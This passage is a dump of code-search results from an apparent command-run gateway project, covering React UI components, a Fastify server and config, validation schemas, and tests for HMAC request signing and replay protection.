style={{ color: 'var(--accent-green)' }}>\n                  {formatDuration(run.duration)}\n                </span>\n              )}\n            </div>\n          </>\n        )}\n      </div>\n\n      {/* Badges */}\n      <div style={{ display: 'flex', gap: '6px', alignItems: 'center', flexShrink: 0 }}>\n        {run.artifact_count && run.artifact_count > 0 && (\n          <span\n            title={`${run.artifact_count} artifacts`}\n            style={{\n              padding: '2px 6px',\n              fontSize: '11px',\n              background: 'var(--bg-tertiary)',\n              borderRadius: '4px',\n              color: 'var(--text-secondary)',\n            }}\n          >\n            \\uD83D\\uDCCE {run.artifact_count}\n          </span>\n        )}\n        {run.hasAssist && (\n          <span\n            title=\"Assist session available\"\n            style={{\n              padding: '2px 6px',\n              fontSize: '11px',\n              background: 'rgba(59, 185, 80, 0.15)',\n              borderRadius: '4px',\n              color: 'var(--accent-green)',\n            }}\n          >\n            \\uD83D\\uDD17 Assist\n          </span>\n        )}\n      </div>\n    </div>\n  );\n}\n\n// List variant for tables\nexport function RunRow({ run, showClient = true, onClick }: RunCardProps) {\n  const navigate = useNavigate();\n  const handleClick = onClick || (() => navigate(`/runs/${run.id}`));\n\n  return (\n    <tr\n      onClick={handleClick}\n      style={{ cursor: 'pointer' }}\n      onMouseEnter={(e) => {\n        e.currentTarget.style.background = 'var(--bg-tertiary)';\n      }}\n      onMouseLeave={(e) => {\n        e.currentTarget.style.background = '';\n      }}\n    >\n      <td style={{ padding: '10px 12px' }}>\n        <span style={{ fontFamily: 'monospace', color: 'var(--accent-blue)' }}>{run.id}</span>\n      </td>\n      <td style={{ padding: '10px 12px' }}>\n        <StatusPill status={run.status} size=\"sm\" />\n      </td>\n      <td style={{ padding: '10px 12px', maxWidth: '200px', overflow: 'hidden', textOverflow: 'ellipsis' }}>\n        {run.label || run.command?.slice(0, 40) || '-'}\n      </td>\n      {showClient && (\n        <td style={{ padding: '10px 12px' }}>{run.client_name || '-'}</td>\n      )}\n      <td style={{ padding: '10px 12px', fontSize: '12px', color: 'var(--text-secondary)' }}>\n        {formatRelativeTime(run.created_at)}\n      </td>\n    </tr>\n  );\n}\n\nexport default RunCard;", "metadata": {"file": "ui/src/components/ui/RunCard.tsx", "start_line": 201, "end_line": 290, "language": "tsx"}}, {"corpus": "code", "source": "ui/src/components/ui/StatusPill.tsx", "location": "ui/src/components/ui/StatusPill.tsx:1", "score": 0.0, "content": "import { ReactNode } from 'react';\n\nexport type Status = 'running' | 'pending' | 'done' | 'failed' | 'stopped' | 'waiting';\nexport type ConnectionStatus = 'online' | 'offline' | 'degraded';\n\ninterface StatusPillProps {\n  status: Status | ConnectionStatus;\n  size?: 'sm' | 'md' | 'lg';\n  showDot?: boolean;\n  children?: ReactNode;\n}\n\nconst statusConfig: Record<string, { bg: string; color: string; label: string }> = {\n  running: { bg: 'rgba(59, 185, 80, 0.15)', color: 'var(--accent-green)', label: 'Running' },\n  pending: { bg: 'rgba(210, 153, 34, 0.15)', color: 'var(--accent-yellow)', label: 'Pending' },\n  done: { bg: 'rgba(88, 166, 255, 0.15)', color: 'var(--accent-blue)', label: 'Done' },\n  failed: { bg: 'rgba(248, 81, 73, 0.15)', color: 'var(--accent-red)', label: 'Failed' },\n  stopped: { bg: 'rgba(139, 148, 158, 0.15)', color: 'var(--text-secondary)', label: 'Stopped' },\n  waiting: { bg: 'rgba(163, 113, 247, 0.15)', color: 'var(--accent-purple)', label: 'Waiting' },\n  online: { bg: 'rgba(59, 185, 80, 0.15)', color: 'var(--accent-green)', label: 'Online' },\n  offline: { bg: 'rgba(248, 81, 73, 0.15)', color: 'var(--accent-red)', label: 'Offline' },\n  degraded: { bg: 'rgba(210, 153, 34, 0.15)', color: 'var(--accent-yellow)', label: 'Degraded' },\n};\n\nconst sizeConfig = {\n  sm: { padding: '2px 8px', fontSize: '11px', dotSize: '6px' },\n  md: { padding: '4px 10px', fontSize: '12px', dotSize: '8px' },\n  lg: { padding: '6px 14px', fontSize: '14px', dotSize: '10px' },\n};\n\nexport function StatusPill({ status, size = 'md', showDot = true, children }: StatusPillProps) {\n  const config = statusConfig[status] || statusConfig.pending;\n  const sizeStyle = sizeConfig[size];\n  const isAnimated = status === 'running';\n\n  return (\n    <span\n      className=\"status-pill\"\n      style={{\n        display: 'inline-flex',\n        alignItems: 'center',\n        gap: '6px',\n        padding: sizeStyle.padding,\n        fontSize: sizeStyle.fontSize,\n        fontWeight: 500,\n        borderRadius: '12px',\n        textTransform: 'uppercase',\n        letterSpacing: '0.5px',\n        background: config.bg,\n        color: config.color,\n        whiteSpace: 'nowrap',\n      }}\n    >\n      {showDot && (\n        <span\n          className={isAnimated ? 'status-dot-pulse' : ''}\n          style={{\n            width: sizeStyle.dotSize,\n            height: sizeStyle.dotSize,\n            borderRadius: '50%',\n            background: 'currentColor',\n            flexShrink: 0,\n          }}\n        />\n      )}\n      {children || config.label}\n    </span>\n  );\n}\n\nexport default StatusPill;", "metadata": {"file": "ui/src/components/ui/StatusPill.tsx", "start_line": 1, "end_line": 71, "language": "tsx"}}, {"corpus": "code", "source": "ui/src/components/ui/Toast.tsx", "location": "ui/src/components/ui/Toast.tsx:1", "score": 0.0, "content": "import { createContext, useContext, useState, useCallback, ReactNode } from 'react';\n\ninterface Toast {\n  id: string;\n  type: 'success' | 'error' | 'info' | 'warning';\n  message: string;\n  duration?: number;\n}\n\ninterface ToastContextType {\n  toasts: Toast[];\n  addToast: (type: Toast['type'], message: string, duration?: number) => void;\n  removeToast: (id: string) => void;\n}\n\nconst ToastContext = createContext<ToastContextType | null>(null);\n\nexport function useToast() {\n  const context = useContext(ToastContext);\n  if (!context) {\n    throw new Error('useToast must be used within ToastProvider');\n  }\n  return context;\n}\n\nexport function ToastProvider({ children }: { children: ReactNode }) {\n  const [toasts, setToasts] = useState<Toast[]>([]);\n\n  const addToast = useCallback((type: Toast['type'], message: string, duration = 4000) => {\n    const id = Math.random().toString(36).slice(2);\n    setToasts(prev => [...prev, { id, type, message, duration }]);\n\n    if (duration > 0) {\n      setTimeout(() => {\n        setToasts(prev => prev.filter(t => t.id !== id));\n      }, duration);\n    }\n  }, []);\n\n  const removeToast = useCallback((id: string) => {\n    setToasts(prev => prev.filter(t => t.id !== id));\n  }, []);\n\n  return (\n    <ToastContext.Provider value={{ toasts, addToast, removeToast }}>\n      {children}\n      <ToastContainer toasts={toasts} onRemove={removeToast} />\n    </ToastContext.Provider>\n  );\n}\n\nfunction ToastContainer({ toasts, onRemove }: { toasts: Toast[]; onRemove: (id: string) => void }) {\n  const typeConfig = {\n    success: { borderColor: 'var(--accent-green)', icon: '\u2713' },\n    error: { borderColor: 'var(--accent-red)', icon: '\u2717' },\n    info: { borderColor: 'var(--accent-blue)', icon: '\u2139' },\n    warning: { borderColor: 'var(--accent-yellow)', icon: '\u26a0' },\n  };\n\n  return (\n    <div\n      style={{\n        position: 'fixed',\n        bottom: '80px', // Above mobile nav\n        right: '16px',\n        left: '16px',\n        display: 'flex',\n        flexDirection: 'column',\n        gap: '8px',\n        zIndex: 1000,\n        pointerEvents: 'none',\n      }}\n    >\n      {toasts.map(toast => {\n        const config = typeConfig[toast.type];\n        return (\n          <div\n            key={toast.id}\n            style={{\n              marginLeft: 'auto',\n              maxWidth: '400px',\n              padding: '12px 16px',\n              background: 'var(--bg-secondary)',\n              border: `1px solid ${config.borderColor}`,\n              borderRadius: '8px',\n              boxShadow: '0 4px 12px rgba(0, 0, 0, 0.3)',\n              display: 'flex',\n              alignItems: 'center',\n              gap: '10px',\n              animation: 'slideIn 0.3s ease',\n              pointerEvents: 'auto',\n            }}\n            onClick={() => onRemove(toast.id)}\n            role=\"alert\"\n          >\n            <span style={{ color: config.borderColor, fontWeight: 'bold' }}>\n              {config.icon}\n            </span>\n            <span style={{ fontSize: '14px', color: 'var(--text-primary)' }}>\n              {toast.message}\n            </span>\n          </div>\n        );\n      })}\n    </div>\n  );\n}\n\nexport default ToastProvider;", "metadata": {"file": "ui/src/components/ui/Toast.tsx", "start_line": 1, "end_line": 109, "language": "tsx"}}, {"corpus": "code", "source": "gateway/src/config.ts", "location": "gateway/src/config.ts:1", "score": 0.0, "content": "import { config as dotenvConfig } from 'dotenv';\nimport { resolve, dirname } from 'path';\nimport { fileURLToPath } from 'url';\nimport { existsSync } from 'fs';\nimport { randomBytes } from 'crypto';\n\nconst __dirname = dirname(fileURLToPath(import.meta.url));\nconst projectRoot = resolve(__dirname, '..', '..');\n\n// Load .env from project root\nconst envPath = resolve(projectRoot, '.env');\nif (existsSync(envPath)) {\n  dotenvConfig({ path: envPath });\n}\n\nexport const config = {\n  // Server\n  port: parseInt(process.env.GATEWAY_PORT || '3100', 10),\n  host: process.env.GATEWAY_HOST || '0.0.0.0',\n\n  // Paths (all under project root)\n  projectRoot,\n  dataDir: resolve(projectRoot, '.data'),\n  dbPath: resolve(projectRoot, '.data', 'db.sqlite'),\n  artifactsDir: resolve(projectRoot, '.data', 'artifacts'),\n  runsDir: resolve(projectRoot, '.data', 'runs'),\n  certsDir: resolve(projectRoot, '.data', 'certs'),\n\n  // Security\n  hmacSecret: process.env.HMAC_SECRET || '',\n  authSecret: process.env.AUTH_SECRET || '',\n  adminPassword: process.env.ADMIN_PASSWORD || '',\n  totpSecret: process.env.TOTP_SECRET || '',\n\n  // Cloudflare Access (optional)\n  cfAccessTeam: process.env.CF_ACCESS_TEAM || '',\n  cfAccessAud: process.env.CF_ACCESS_AUD || '',\n\n  // TLS\n  tlsEnabled: process.env.TLS_ENABLED !== 'false',\n  tlsCert: resolve(projectRoot, '.data', 'certs', 'server.crt'),\n  tlsKey: resolve(projectRoot, '.data', 'certs', 'server.key'),\n\n  // Limits\n  maxBodySize: 10 * 1024 * 1024, // 10MB\n  maxArtifactSize: 50 * 1024 * 1024, // 50MB\n  rateLimit: {\n    max: 100,\n    timeWindow: '1 minute'\n  },\n  clockSkewSeconds: 300, // 5 minutes\n  nonceExpirySeconds: 600, // 10 minutes\n\n  // Retention\n  runRetentionDays: parseInt(process.env.RUN_RETENTION_DAYS || '30', 10),\n\n  // Allowlisted commands (can be extended via env)\n  allowlistedCommands: [\n    // Test commands\n    'npm test',\n    'npm run test',\n    'pnpm test',\n    'pnpm run test',\n    'yarn test',\n    'pytest',\n    'pytest -v',\n    'go test ./...',\n    'cargo test',\n    // Git commands\n    'git diff',\n    'git diff --cached',\n    'git status',\n    'git log --oneline -10',\n    // Directory navigation (handled specially in wrapper)\n    'cd',\n    'ls',\n    'ls -la',\n    'ls -l',\n    'ls -a',\n    'll',\n    'dir',\n    'pwd'\n  ].concat((process.env.EXTRA_ALLOWED_COMMANDS || '').split(',').filter(Boolean)),\n\n  // Secret patterns to redact\n  secretPatterns: [\n    // Match various key/password/token formats with = or : separators (handles spaces after separator)\n    /(?:api[_-]?key|apiKey|API_KEY|APIKEY|secret|password|PASSWORD|token|TOKEN|auth|AUTH|bearer|Bearer|BEARER|credential)[=:\\s]\\s*[\"']?[\\w\\-\\.]+[\"']?/g,\n    // OpenAI keys\n    /sk-[a-zA-Z0-9]{20,}/g,\n    // GitHub tokens\n    /ghp_[a-zA-Z0-9]{36}/g,\n    /ghs_[a-zA-Z0-9]{36}/g,\n    // NPM tokens\n    /npm_[a-zA-Z0-9]{36}/g,\n    // PEM certificates\n    /-----BEGIN[\\s\\S]*?-----END[^-]*-----/g\n  ]\n};\n\n// Validate critical config\nexport function validateConfig(): void {\n  if (!config.hmacSecret || config.hmacSecret.length < 32) {\n    console.warn('WARNING: HMAC_SECRET not set or too short. Generating random secret for this session.');\n    config.hmacSecret = randomBytes(32).toString('hex');\n  }\n\n  if (!config.authSecret || config.authSecret.length < 32) {\n    console.warn('WARNING: AUTH_SECRET not set or too short. Generating random secret for this session.');\n    config.authSecret = randomBytes(32).toString('hex');\n  }\n}", "metadata": {"file": "gateway/src/config.ts", "start_line": 1, "end_line": 112, "language": "ts"}}, {"corpus": "code", "source": "gateway/src/index.ts", "location": "gateway/src/index.ts:1", "score": 0.0, "content": "import Fastify from 'fastify';\nimport fastifyWebsocket from '@fastify/websocket';\nimport fastifyCors from '@fastify/cors';\nimport fastifyHelmet from '@fastify/helmet';\nimport fastifyRateLimit from '@fastify/rate-limit';\nimport fastifyMultipart from '@fastify/multipart';\nimport fastifyStatic from '@fastify/static';\nimport fastifyCookie from '@fastify/cookie';\nimport { readFileSync, existsSync, mkdirSync } from 'fs';\nimport { join } from 'path';\n\nimport { config, validateConfig } from './config.js';\nimport { db } from './services/database.js';\nimport { setupWebSocket, getConnectionStats } from './services/websocket.js';\nimport { runsRoutes } from './routes/runs.js';\nimport { artifactRoutes } from './routes/artifacts.js';\nimport { authRoutes } from './routes/auth.js';\nimport { clientsRoutes } from './routes/clients.js';\nimport { alertsRoutes } from './routes/alerts.js';\nimport { dashboardRoutes } from './routes/dashboard.js';\nimport { modelsRoutes } from './routes/models.js';\nimport { rawBodyPlugin } from './middleware/auth.js';\n\n// Validate configuration\nvalidateConfig();\n\n// Ensure data directories exist\nfor (const dir of [config.dataDir, config.artifactsDir, config.runsDir, config.certsDir]) {\n  if (!existsSync(dir)) {\n    mkdirSync(dir, { recursive: true });\n  }\n}\n\n// Build HTTPS options if TLS enabled\nlet httpsOptions: { key: Buffer; cert: Buffer } | undefined;\nif (config.tlsEnabled) {\n  if (existsSync(config.tlsCert) && existsSync(config.tlsKey)) {\n    httpsOptions = {\n      key: readFileSync(config.tlsKey),\n      cert: readFileSync(config.tlsCert)\n    };\n    console.log('TLS enabled with certificates from .data/certs/');\n  } else {\n    console.warn('TLS certificates not found. Run scripts/dev-cert.sh to generate them.');\n    console.warn('Starting in HTTP mode (not recommended for production).');\n  }\n}\n\n// Create Fastify instance\nconst fastify = Fastify({\n  logger: {\n    level: process.env.LOG_LEVEL || 'info',\n    transport: {\n      target: 'pino-pretty',\n      options: {\n        translateTime: 'HH:MM:ss Z',\n        ignore: 'pid,hostname'\n      }\n    }\n  },\n  ...(httpsOptions ? { https: httpsOptions } : {}),\n  bodyLimit: config.maxBodySize,\n  trustProxy: true\n});\n\n// Register plugins\nawait fastify.register(fastifyCors, {\n  origin: true, // Configure properly for production\n  credentials: true\n});\n\nawait fastify.register(fastifyHelmet, {\n  contentSecurityPolicy: {\n    directives: {\n      defaultSrc: [\"'self'\"],\n      scriptSrc: [\"'self'\", \"'unsafe-inline'\"],\n      styleSrc: [\"'self'\", \"'unsafe-inline'\"],\n      imgSrc: [\"'self'\", 'data:', 'blob:'],\n      connectSrc: [\"'self'\", 'wss:', 'ws:']\n    }\n  }\n});\n\nawait fastify.register(fastifyRateLimit, {\n  max: config.rateLimit.max,\n  timeWindow: config.rateLimit.timeWindow,\n  keyGenerator: (request) => {\n    // Use CF header if behind Cloudflare\n    return request.headers['cf-connecting-ip'] as string ||\n           request.headers['x-forwarded-for'] as string ||\n           request.ip;\n  }\n});\n\nawait fastify.register(fastifyMultipart, {\n  limits: {\n    fileSize: config.maxArtifactSize\n  }\n});\n\n// Cookie support for sessions\nawait fastify.register(fastifyCookie as any, {\n  secret: config.authSecret\n});\n\n// Serve UI static files if they exist\nconst uiDistPath = join(config.projectRoot, 'ui', 'dist');\nif (existsSync(uiDistPath)) {\n  await fastify.register(fastifyStatic, {\n    root: uiDistPath,\n    prefix: '/'\n  });\n\n  // SPA fallback\n  fastify.setNotFoundHandler((request, reply) => {\n    if (request.url.startsWith('/api/') || request.url.startsWith('/ws')) {\n      return reply.code(404).send({ error: 'Not found' });\n    }\n    return reply.sendFile('index.html');\n  });\n}\n\n// WebSocket support\nawait fastify.register(fastifyWebsocket, {\n  options: {\n    maxPayload: 1024 * 1024, // 1MB\n    clientTracking: true\n  }\n});\n\n// Raw body capture for signature verification\nrawBodyPlugin(fastify);\n\n// Setup WebSocket handler\nsetupWebSocket(fastify);\n\n// Register routes\nawait fastify.register(runsRoutes);\nawait fastify.register(artifactRoutes);\nawait fastify.register(authRoutes);\nawait fastify.register(clientsRoutes);\nawait fastify.register(alertsRoutes);\nawait fastify.register(dashboardRoutes);\nawait fastify.register(modelsRoutes);\n\n// Health check\nfastify.get('/api/health', async () => {\n  const stats = getConnectionStats();\n  return {\n    status: 'ok',\n    timestamp: new Date().toISOString(),\n    connections: stats\n  };\n});\n\n// Graceful shutdown\nconst shutdown = async () => {\n  console.log('Shutting down...');\n  await fastify.close();\n  db.close();\n  process.exit(0);\n};\n\nprocess.on('SIGINT', shutdown);\nprocess.on('SIGTERM', shutdown);\n\n// Start server\ntry {\n  const address = await fastify.listen({\n    port: config.port,\n    host: config.host\n  });\n  console.log(`Gateway server listening at ${address}`);\n  console.log(`WebSocket available at ${address.replace('http', 'ws')}/ws`);\n\n  if (!httpsOptions) {\n    console.warn('\\n\u26a0\ufe0f  Running without TLS. Generate certificates with: npm run dev:cert\\n');\n  }\n} catch (err) {\n  fastify.log.error(err);\n  process.exit(1);\n}", "metadata": {"file": "gateway/src/index.ts", "start_line": 1, "end_line": 182, "language": "ts"}}, {"corpus": "code", "source": "gateway/src/schemas.ts", "location": "gateway/src/schemas.ts:1", "score": 0.0, "content": "/**\n * Zod validation schemas for all API endpoints\n */\n\nimport { z } from 'zod';\n\n// =============================================================================\n// Runs\n// =============================================================================\n\nexport const createRunSchema = z.object({\n  command: z.string().max(10000).optional(),\n  metadata: z.record(z.any()).optional()\n});\n\nexport const runIdParamSchema = z.object({\n  runId: z.string().min(1).max(50)\n});\n\nexport const eventsQuerySchema = z.object({\n  after: z.string().regex(/^\\d+$/).optional(),\n  limit: z.string().regex(/^\\d+$/).optional()\n});\n\n// =============================================================================\n// Events\n// =============================================================================\n\nexport const eventSchema = z.object({\n  type: z.enum(['stdout', 'stderr', 'marker', 'info', 'error', 'assist']),\n  data: z.string().max(1024 * 1024), // 1MB max per event\n  sequence: z.number().int().min(0).optional()\n});\n\n// =============================================================================\n// Commands\n// =============================================================================\n\nexport const commandSchema = z.object({\n  command: z.string().min(1).max(1000)\n});\n\nexport const commandIdParamSchema = z.object({\n  runId: z.string().min(1).max(50),\n  commandId: z.string().min(1).max(50)\n});\n\nexport const commandAckSchema = z.object({\n  result: z.string().max(10 * 1024 * 1024).optional(), // 10MB max result\n  error: z.string().max(100000).optional()\n});\n\n// =============================================================================\n// Auth\n// =============================================================================\n\nexport const loginSchema = z.object({\n  username: z.string().min(1).max(100),\n  password: z.string().min(1).max(200),\n  totpCode: z.string().length(6).regex(/^\\d+$/).optional()\n});\n\nexport const setupSchema = z.object({\n  username: z.string()\n    .min(3, 'Username must be at least 3 characters')\n    .max(50, 'Username must be at most 50 characters')\n    .regex(/^[a-zA-Z0-9_-]+$/, 'Username can only contain letters, numbers, underscores, and hyphens'),\n  password: z.string()\n    .min(12, 'Password must be at least 12 characters')\n    .max(200, 'Password must be at most 200 characters'),\n  enableTotp: z.boolean().optional()\n});\n\nexport const createUserSchema = z.object({\n  username: z.string()\n    .min(3)\n    .max(50)\n    .regex(/^[a-zA-Z0-9_-]+$/),\n  password: z.string().min(12).max(200),\n  role: z.enum(['admin', 'operator', 'viewer'])\n});\n\n// =============================================================================\n// Artifacts\n// =============================================================================\n\nexport const artifactIdParamSchema = z.object({\n  artifactId: z.string().min(1).max(50)\n});\n\n// =============================================================================\n// Type exports\n// =============================================================================\n\nexport type CreateRunInput = z.infer<typeof createRunSchema>;\nexport type EventInput = z.infer<typeof eventSchema>;\nexport type CommandInput = z.infer<typeof commandSchema>;\nexport type CommandAckInput = z.infer<typeof commandAckSchema>;\nexport type LoginInput = z.infer<typeof loginSchema>;\nexport type SetupInput = z.infer<typeof setupSchema>;\nexport type CreateUserInput = z.infer<typeof createUserSchema>;", "metadata": {"file": "gateway/src/schemas.ts", "start_line": 1, "end_line": 101, "language": "ts"}}, {"corpus": "code", "source": "gateway/src/middleware/auth.test.ts", "location": "gateway/src/middleware/auth.test.ts:1", "score": 0.0, "content": "import { describe, it, expect, vi, beforeEach } from 'vitest';\n\n// Mock config before imports\nvi.mock('../config.js', () => ({\n  config: {\n    hmacSecret: 'test-secret-key-that-is-long-enough',\n    clockSkewSeconds: 300,\n    nonceExpirySeconds: 600,\n    cfAccessTeam: '',\n    tlsEnabled: false\n  }\n}));\n\n// Mock database\nvi.mock('../services/database.js', () => ({\n  db: {\n    prepare: vi.fn().mockReturnValue({\n      get: vi.fn(),\n      run: vi.fn()\n    })\n  }\n}));\n\nimport { createSignature, hashBody, generateNonce, isTimestampValid } from '../utils/crypto.js';\n\ndescribe('Auth Middleware Logic', () => {\n  describe('Signature Verification Flow', () => {\n    const testSecret = 'test-secret-key-that-is-long-enough';\n\n    function verifyRequest(request: {\n      method: string;\n      path: string;\n      body: string;\n      signature: string;\n      timestamp: number;\n      nonce: string;\n      runId?: string;\n      capabilityToken?: string;\n    }): { valid: boolean; error?: string } {\n      // Check timestamp\n      if (!isTimestampValid(request.timestamp)) {\n        return { valid: false, error: 'Timestamp out of range' };\n      }\n\n      // Verify signature\n      const bodyHash = hashBody(request.body);\n      const expectedSig = createSignature({\n        method: request.method,\n        path: request.path,\n        bodyHash,\n        timestamp: request.timestamp,\n        nonce: request.nonce,\n        runId: request.runId,\n        capabilityToken: request.capabilityToken\n      });\n\n      if (request.signature !== expectedSig) {\n        return { valid: false, error: 'Invalid signature' };\n      }\n\n      return { valid: true };\n    }\n\n    it('should accept valid request', () => {\n      const timestamp = Math.floor(Date.now() / 1000);\n      const nonce = generateNonce();\n      const body = '{\"type\":\"stdout\",\"data\":\"test\"}';\n\n      const signature = createSignature({\n        method: 'POST',\n        path: '/api/ingest/event',\n        bodyHash: hashBody(body),\n        timestamp,\n        nonce\n      });\n\n      const result = verifyRequest({\n        method: 'POST',\n        path: '/api/ingest/event',\n        body,\n        signature,\n        timestamp,\n        nonce\n      });\n\n      expect(result.valid).toBe(true);\n    });\n\n    it('should reject expired timestamp', () => {\n      const timestamp = Math.floor(Date.now() / 1000) - 600; // 10 minutes ago\n      const nonce = generateNonce();\n      const body = '{}';\n\n      const signature = createSignature({\n        method: 'POST',\n        path: '/api/test',\n        bodyHash: hashBody(body),\n        timestamp,\n        nonce\n      });\n\n      const result = verifyRequest({\n        method: 'POST',\n        path: '/api/test',\n        body,\n        signature,\n        timestamp,\n        nonce\n      });\n\n      expect(result.valid).toBe(false);\n      expect(result.error).toBe('Timestamp out of range');\n    });\n\n    it('should reject future timestamp beyond skew', () => {\n      const timestamp = Math.floor(Date.now() / 1000) + 600; // 10 minutes in future\n      const nonce = generateNonce();\n      const body = '{}';\n\n      const signature = createSignature({\n        method: 'POST',\n        path: '/api/test',\n        bodyHash: hashBody(body),\n        timestamp,\n        nonce\n      });\n\n      const result = verifyRequest({\n        method: 'POST',\n        path: '/api/test',\n        body,\n        signature,\n        timestamp,\n        nonce\n      });\n\n      expect(result.valid).toBe(false);\n    });\n\n    it('should reject tampered body', () => {\n      const timestamp = Math.floor(Date.now() / 1000);\n      const nonce = generateNonce();\n      const originalBody = '{\"data\":\"original\"}';\n      const tamperedBody = '{\"data\":\"tampered\"}';\n\n      const signature = createSignature({\n        method: 'POST',\n        path: '/api/test',\n        bodyHash: hashBody(originalBody),\n        timestamp,\n        nonce\n      });\n\n      const result = verifyRequest({\n        method: 'POST',\n        path: '/api/test',\n        body: tamperedBody,\n        signature,\n        timestamp,\n        nonce\n      });\n\n      expect(result.valid).toBe(false);\n      expect(result.error).toBe('Invalid signature');\n    });\n\n    it('should reject different method', () => {\n      const timestamp = Math.floor(Date.now() / 1000);\n      const nonce = generateNonce();\n      const body = '{}';\n\n      const signature = createSignature({\n        method: 'POST',\n        path: '/api/test',\n        bodyHash: hashBody(body),\n        timestamp,\n        nonce\n      });\n\n      const result = verifyRequest({\n        method: 'GET', // Different method\n        path: '/api/test',\n        body,\n        signature,\n        timestamp,\n        nonce\n      });\n\n      expect(result.valid).toBe(false);\n    });\n\n    it('should reject different path', () => {\n      const timestamp = Math.floor(Date.now() / 1000);\n      const nonce = generateNonce();\n      const body = '{}';\n\n      const signature = createSignature({\n        method: 'POST',\n        path: '/api/original',\n        bodyHash: hashBody(body),", "metadata": {"file": "gateway/src/middleware/auth.test.ts", "start_line": 1, "end_line": 200, "language": "ts"}}, {"corpus": "code", "source": "gateway/src/middleware/auth.test.ts", "location": "gateway/src/middleware/auth.test.ts:201", "score": 0.0, "content": "        timestamp,\n        nonce\n      });\n\n      const result = verifyRequest({\n        method: 'POST',\n        path: '/api/different', // Different path\n        body,\n        signature,\n        timestamp,\n        nonce\n      });\n\n      expect(result.valid).toBe(false);\n    });\n\n    it('should include runId and capabilityToken in signature', () => {\n      const timestamp = Math.floor(Date.now() / 1000);\n      const nonce = generateNonce();\n      const body = '{}';\n\n      const signature = createSignature({\n        method: 'POST',\n        path: '/api/test',\n        bodyHash: hashBody(body),\n        timestamp,\n        nonce,\n        runId: 'run-123',\n        capabilityToken: 'cap-token'\n      });\n\n      // Should fail without runId/token\n      const result1 = verifyRequest({\n        method: 'POST',\n        path: '/api/test',\n        body,\n        signature,\n        timestamp,\n        nonce\n      });\n      expect(result1.valid).toBe(false);\n\n      // Should pass with correct runId/token\n      const result2 = verifyRequest({\n        method: 'POST',\n        path: '/api/test',\n        body,\n        signature,\n        timestamp,\n        nonce,\n        runId: 'run-123',\n        capabilityToken: 'cap-token'\n      });\n      expect(result2.valid).toBe(true);\n    });\n  });\n\n  describe('Replay Protection', () => {\n    it('should track used nonces', () => {\n      const usedNonces = new Set<string>();\n\n      function checkNonce(nonce: string): boolean {\n        if (usedNonces.has(nonce)) {\n          return false; // Replay detected\n        }\n        usedNonces.add(nonce);\n        return true;\n      }\n\n      const nonce1 = generateNonce();\n      const nonce2 = generateNonce();\n\n      expect(checkNonce(nonce1)).toBe(true);\n      expect(checkNonce(nonce2)).toBe(true);\n      expect(checkNonce(nonce1)).toBe(false); // Replay!\n      expect(checkNonce(nonce2)).toBe(false); // Replay!\n    });\n\n    it('should expire old nonces', () => {\n      const nonces = new Map<string, number>();\n      const EXPIRY_SECONDS = 600;\n\n      function addNonce(nonce: string) {\n        nonces.set(nonce, Date.now());\n      }\n\n      function isNonceValid(nonce: string): boolean {\n        const created = nonces.get(nonce);\n        if (!created) return true; // New nonce\n        return (Date.now() - created) > EXPIRY_SECONDS * 1000;\n      }\n\n      function cleanupNonces() {\n        const cutoff = Date.now() - EXPIRY_SECONDS * 1000;\n        for (const [nonce, created] of nonces) {\n          if (created < cutoff) {\n            nonces.delete(nonce);\n          }\n        }\n      }\n\n      const nonce = generateNonce();\n      addNonce(nonce);\n\n      expect(isNonceValid(nonce)).toBe(false); // Just added, still valid window\n\n      // Simulate time passing (in real implementation, we'd use timers)\n      nonces.set(nonce, Date.now() - (EXPIRY_SECONDS + 1) * 1000);\n      cleanupNonces();\n\n      expect(nonces.has(nonce)).toBe(false); // Cleaned up\n    });\n  });\n\n  describe('Role-Based Access Control', () => {\n    const roles = ['admin', 'operator', 'viewer'];\n\n    function hasPermission(userRole: string, requiredRoles: string[]): boolean {\n      return requiredRoles.includes(userRole);\n    }\n\n    it('admin should have all permissions', () => {\n      expect(hasPermission('admin', ['admin'])).toBe(true);\n      expect(hasPermission('admin', ['admin', 'operator'])).toBe(true);\n      expect(hasPermission('admin', ['admin', 'operator', 'viewer'])).toBe(true);\n    });\n\n    it('operator should have operator and viewer permissions', () => {\n      expect(hasPermission('operator', ['admin'])).toBe(false);\n      expect(hasPermission('operator', ['operator'])).toBe(true);\n      expect(hasPermission('operator', ['admin', 'operator'])).toBe(true);\n    });\n\n    it('viewer should only have viewer permission', () => {\n      expect(hasPermission('viewer', ['admin'])).toBe(false);\n      expect(hasPermission('viewer', ['operator'])).toBe(false);\n      expect(hasPermission('viewer', ['viewer'])).toBe(true);\n      expect(hasPermission('viewer', ['admin', 'operator', 'viewer'])).toBe(true);\n    });\n\n    it('should reject unknown roles', () => {\n      expect(hasPermission('unknown', ['admin'])).toBe(false);\n      expect(hasPermission('unknown', ['viewer'])).toBe(false);\n    });\n  });\n\n  describe('Capability Token Validation', () => {\n    it('should validate capability token matches run', () => {\n      const runs = new Map<string, string>();\n      runs.set('run-1', 'cap-token-1');\n      runs.set('run-2', 'cap-token-2');\n\n      function validateCapability(runId: string, token: string): boolean {\n        const expectedToken = runs.get(runId);\n        return expectedToken === token;\n      }\n\n      expect(validateCapability('run-1', 'cap-token-1')).toBe(true);\n      expect(validateCapability('run-2', 'cap-token-2')).toBe(true);\n      expect(validateCapability('run-1', 'cap-token-2')).toBe(false);\n      expect(validateCapability('run-2', 'cap-token-1')).toBe(false);\n      expect(validateCapability('run-3', 'any-token')).toBe(false);\n    });\n  });\n});\n\ndescribe('Cloudflare Access Headers', () => {\n  it('should extract user from CF headers', () => {\n    const headers = {\n      'cf-access-authenticated-user-email': 'user@example.com',\n      'cf-access-jwt-assertion': 'eyJ...'\n    };\n\n    function extractCfUser(headers: Record<string, string>) {\n      const email = headers['cf-access-authenticated-user-email'];\n      const jwt = headers['cf-access-jwt-assertion'];\n\n      if (email && jwt) {\n        return {\n          id: `cf:${email}`,\n          username: email,\n          source: 'cloudflare'\n        };\n      }\n      return null;\n    }\n\n    const user = extractCfUser(headers);\n    expect(user).toBeDefined();\n    expect(user?.username).toBe('user@example.com');\n    expect(user?.source).toBe('cloudflare');\n  });\n\n  it('should return null without CF headers', () => {\n    const headers = {};\n\n    function extractCfUser(headers: Record<string, string>) {\n      const email = headers['cf-access-authenticated-user-email'];\n      const jwt = headers['cf-access-jwt-assertion'];\n", "metadata": {"file": "gateway/src/middleware/auth.test.ts", "start_line": 201, "end_line": 400, "language": "ts"}}, {"corpus": "code", "source": "gateway/src/middleware/auth.test.ts", "location": "gateway/src/middleware/auth.test.ts:401", "score": 0.0, "content": "      if (email && jwt) {\n        return { id: `cf:${email}`, username: email, source: 